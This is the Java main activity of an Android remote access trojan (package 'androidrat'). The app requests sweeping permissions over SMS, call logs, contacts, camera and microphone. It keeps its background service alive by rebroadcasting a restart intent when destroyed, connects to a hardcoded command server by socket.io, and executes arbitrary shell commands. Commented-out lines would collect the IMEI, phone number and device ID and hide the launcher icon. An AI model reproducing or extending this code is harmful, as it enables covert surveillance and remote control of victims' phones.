package com.ot.androidrat;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;


import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Arrays;

import io.socket.client.IO;
import io.socket.client.Socket;

public class MainActivity extends AppCompatActivity {


    private EditText command;
    private TextView shellResult;

    public MainActivity() {
    }

    @Override
    protected void onDestroy() {
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, RestartServiceReceiver.class);
        this.sendBroadcast(broadcastIntent);
        super.onDestroy();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkPermission();
        startService(new Intent(this, MainService.class));
//        PackageManager p = getPackageManager();
//        ComponentName componentName = new ComponentName(this, com.ot.androidrat.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
//        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }




    @RequiresApi(api = Build.VERSION_CODES.O)
    public void ioConnection(View view){
        // TelephonyManager tm = (TelephonyManager) getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
        // String simOperatorName = tm.getSimOperatorName();
        // String imei = tm.getImei();
        // String phoneNo = tm.getLine1Number();
//        int osVersion = android.os.Build.VERSION.SDK_INT;
//        String android_id = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
        try{
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;
            Socket ioSocket = IO.socket("http://192.168.206.11:5001/");
            ioSocket.connect();
            ioSocket.emit("android", "from android");
            ioSocket.on("android value", args -> Toast.makeText(MainActivity.this, Arrays.toString(args), Toast.LENGTH_LONG).show());
//            ioSocket.emit("pong", android_id);
//            ioSocket.on("ping", args -> {
//                ioSocket.emit("pong", "pong reponse");
//                Toast.makeText(MainActivity.this, "received ping", Toast.LENGTH_LONG).show();
//            });
        }catch  (Exception ex){
            Log.i("Socket", ex.getMessage());
        }
    }

    public void executeShell(View view){
        try{
            Process su = Runtime.getRuntime().exec(command.getText().toString());
            StringBuilder output = new StringBuilder();
            BufferedReader reader = new BufferedReader(new InputStreamReader(su.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null){
                output.append(line).append("\n");
            }
            shellResult.setText(output);
        }catch (IOException ignored){

        }
    }




    public void checkPermission()
    {
        int PERMISSION_ALL = 1;
        String[] PERMISSIONS = {
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.RECEIVE_BOOT_COMPLETED,
                Manifest.permission.SET_WALLPAPER,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CALL_LOG,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.VIBRATE
//                <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE" />
//    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
//    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
//    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
        };
        if (!hasPermissions(this, PERMISSIONS)) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
        }

    }
    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }
}